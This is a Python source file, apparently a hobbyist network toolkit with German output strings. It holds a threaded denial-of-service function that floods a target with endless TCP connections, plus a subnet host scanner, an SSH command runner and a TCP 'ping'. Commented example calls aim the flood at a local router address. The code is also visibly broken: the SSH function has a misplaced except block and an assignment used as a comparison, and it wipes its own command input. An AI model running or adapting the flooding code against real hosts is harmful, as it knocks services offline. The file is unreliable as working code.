import socket
import time
import paramiko
from threading import Thread

def dos(ip, port = 80, text = "Attake", thrd = 10, prnt = 1): #ip = host, port = port, text = text to send, thrd = the value of freds to create, prnt = 0 --returns only '!'; 1 --returns '!' and prints '!'.
    
    host = ip
    ip = host
    port = port
    
    def ddos():
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((ip, port))
                sock.send(str.encode(text + " \r\n"))
                sock.sendto(str.encode(text + " \r\n"), (ip, port))
            except socket.error:
                if prnt == 1:
                    print("!")
                return("!")
            sock.close()
    
    for i in range(thrd):
        t = Thread(target=ddos)
        t.start()

def scan(von, bis, port = 80, text = "Scan...", prnt = 1, timeout = 0.001):
    ready = 0
    ab = []
    zu = []
    red = [0, 0, 0, 0, 0, 0]
    plus = [0, 0, 0, 0, 0, 0, 0, 0, 0]
    scanned = ["no errors", 0, 0, 0, 0, 0]
    fact = [0, 0, 0, 0 ,0 ,0 ,0]
    ab = von.split('.', 3)
    abb = ab
    zu = bis.split('.', 3)
    ipgo = ab
    ipgo
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    iptoping = von
    drei = ab[2]

    if prnt == 1:
        print("Scanning for reachable hosts...")
    
    if int(ab[0]) == int(zu[0]):
        fact[1] = 1

    if int(ab[1]) == int(zu[1]):
        fact[2] = 1

    if int(ab[2]) == int(zu[2]):
        fact[3] = 1

    while ready == 0:
        
        try:
            sock.connect((iptoping, port))
            sock.send(str.encode(text + " \r\n"))
            hostde = "yes"
        except socket.error:
            hostde = "no"
            scanned[3] = int(scanned[3]) + 1
        if hostde == "yes":
            if prnt == 1:
                print(time.strftime("%c") + ": Host discovered: " + iptoping)
            scanned.append(iptoping)
            scanned[2] = int(scanned[2]) + 1
        scanned[4] = int(scanned[4]) + 1
        
        print("scanned: " + str(iptoping))

        if int(ipgo[0]) == int(zu[0]) and int(ipgo[1]) == int(zu[1]) and int(ipgo[2]) == int(zu[2]) and int(ipgo[3]) == int(zu[3]):
            ready = 1

        if not ready == 1:
            if fact[1] == 1:
                if fact[2] == 1:
                    if fact[3] == 1:
                        if not int(ipgo[3]) == int(zu[3]):
                            ipgo[3] = int(ipgo[3]) + 1
                        else:
                            ready = 1
                    else:
                        if not int(ipgo[2]) == int(zu[2]):
                            if not int(ipgo[3]) == 255:
                                ipgo[3] = int(ipgo[3]) + 1
                            else:
                                ipgo[2] = int(ipgo[2]) + 1
                                ipgo[3] = 0
                        else:
                            if not int(ipgo[3]) == int(zu[3]):
                                ipgo[3] = int(ipgo[3]) + 1
                            else:
                                ready = 1
                else:
                    if not int(ipgo[1]) == int(zu[1]):
                        if not int(ipgo[2]) == 255:
                            if not int(ipgo[3]) == 255:
                                ipgo[3] = ipgo[3] + 1
                            else:
                                ipgo[2] = int(ipgo[2]) + 1
                                ipgo[3] = 0
                        else:
                            ipgo[1] = int(ipgo[1]) + 1
                            ipgo[2] = 0
                    else:
                        ready = 1
            else:
                if not int(ipgo[0]) == int(zu[0]):
                    if not int(ipgo[1]) == 255:
                        if not int(ipgo[2]) == 255:
                            if not int(ipgo[3]) == 255:
                                ipgo[3] = int(ipgo[3]) + 1
                            else:
                                ipgo[2] = int(ipgo[2]) + 1
                                ipgo[3] = 0
                        else:
                            ipgo[1] = int(ipgo[1]) + 1
                            ipgo[2] = 0
                    else:
                        ipgo[0] = int(ipgo[0]) + 1
                        ipgo[1] = 0
                else:
                    ready = 1

            iptoping = str(ipgo[0]) + "." + str(ipgo[1]) + "." + str(ipgo[2]) + "." + str(ipgo[3])
        
        time.sleep(timeout)
    return(scanned)
    if prnt == 1:
        print("Finish.")

def ssh(ip, user, passwd, commands, port = 22):
    commands = []
    commands = commands.split(';')
    rea = ["no Error"]
    try:
        mssh = paramiko.SSHClient()
        mssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        mssh.connect(ip, port, user, passwd)
        mshell = mssh.invoke_shell()
        for command in commands:
            stdout, stderr = mssh.exec_command(command)
        mshell.close
        mssh.close
    print(stdout)
    print(stderr)

    except:
        if prnt = 1:
            print("Error")
        rea[1] = "Error"

def ping(ip = "no", port = 80, text = "Pinging...", mal = 10, prnt = 1, timeout = 1):

    ret = []
    ret = ["no error", 0, 0]
    ret[0] = "no error"
    if ip == "no":
        ret[0] = "IP must be defined!"
    mang = 0
    mangp = 0
    if prnt == 1:
        print(time.strftime("%c") + "Ping wird ausgeführt für: " + ip)

    for ebbes in range(mal):

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(str.encode(text + " \r\n"))
            reach = "yes"
        except socket.error:
            reach = "no" 

        if reach == "yes":
            if prnt == 1:
                print(time.strftime("%c") + ": Ping: Antwort: " + ip)
            mangp = mangp + 1

        if reach == "no":
            if prnt == 1:
                print(time.strftime("%c") + ": Ping: Unerreichbar: " + ip)
            mang = mang + 1
            if not ret[0] == "timeout":
                ret[0] = "timeout"

        if not ret[0] == "timeout":
            time.sleep(timeout)

    if prnt == 1:
        print("\n \n" + time.strftime("%c") + ": Ergebnis:")

    eins = mang
    zwei = mangp
    ret[1] = eins
    ret[2] = zwei
    str(eins)
    str(zwei) 

    if prnt == 1:
        print(str(eins) + " fehlgeschlagen")
    if prnt == 1:
        print(str(zwei) + " geantwortet \n \n")

    return(ret)

# dos("192.168.178.1", 80, "GET " + "haste mal 3 fufzig" + "HTTP/1.1", 2)
# shh()
# das = ping("192.168.178.52", 80,"i scan you")
# scan("192.168.178.0", "192.168.178.255")



# if fact == 2:
#     if int(ipgo[1]) <= 154:
#         ipgo[1] = int(ipgo[1]) + 1
# if fact == 3:
#     if int(ipgo[2]) <= 254:
#         ipgo[2] = int(ipgo[2]) + 1
#     else:
#         ipgo[2] = 0
#         fact = 4
# if fact == 4:
#     ipgo[3] = ipgo[3] + 1


#       if int(ipgo[0]) <= 254:
#           ipgo[0] = int(ipgo[0]) + 1
#
#       if int(ipgo[1]) <= 254:
#           ipgo[1] = int(ipgo[1]) + 1
#
#       if int(ipgo[2]) <= 254:
#           ipgo[2] = int(ipgo[2]) + 1
#
#       if int(ipgo[3]) <= 254:
#           ipgo[3] = int(ipgo[3]) + 1


#        if not int(zu[0]) >= int(ipgo[0]):
#            red[1] = 1
#        if not int(zu[1]) >= int(ipgo[1]):
#            red[2] = 1
#        if not int(zu[2]) >= int(ipgo[2]):
#            red[3] = 1
#        if not int(zu[3]) >= int(ipgo[3]):
#            red[4] = 1
#
#        if int(red[1]) == 1:
#            fact = 1
#        if int(red[2]) == 1 and int(red[1]) == 1:
#            fact = 2
#        if int(red[3]) == 1 and int(red[2]) == 1 and int(red[1]) == 1:
#            fact = 3
#        if int(red[4]) == 1 and int(red[3]) == 1 and int(red[2]) == 1 and int(red[1]) == 1:
#            ready = 1
#            
#        plus[1] = 1


#       if int(ipgo[0]) == 255:
#           plus[1] = int(plus[1]) + 1
#           ipgo[0] = 0
#       if int(ipgo[1]) == 255:
#           plus[2] = int(plus[2]) + 1
#           ipgo[1] = 0
#       if int(ipgo[2]) == 255:
#           plus[3] = int(plus[3]) + 1
#           ipgo[2] = 0
#       if int(ipgo[3]) == 255:
#           plus[4] = int(plus[4]) + 1
#           ipgo[3] = 0
#
#       if int(ipgo[0]) <= 254:
#           ipgo[0] = int(ipgo[0]) + int(plus[1])
#       if int(ipgo[1]) <= 254:
#           ipgo[1] = int(ipgo[1]) + int(plus[2])
#       if int(ipgo[2]) <= 254:
#           ipgo[2] = int(ipgo[2]) + int(plus[3])
#       if int(ipgo[3]) <= 254:
#           ipgo[3] = int(ipgo[3]) + int(plus[4])

#                        if not int(ipgo[3]) == int(zu[3]):
#                            if ipgo[3] == 255:
#                                ipgo[3] = 0
#                            if not int(ipgo[2]) == int(zu[2]):
#                                ipgo[2] = int(ipgo[2]) + 1
#                            else:
#                                ipgo[3] = int(ipgo[3]) + 1
#                                ipgo[2] = int(drei)
#                        else:
#                            if ipgo[2] == zu[2]:
#                                ready = 1
#                            else:
#                                ipgo[2] = ipgo[2] + 1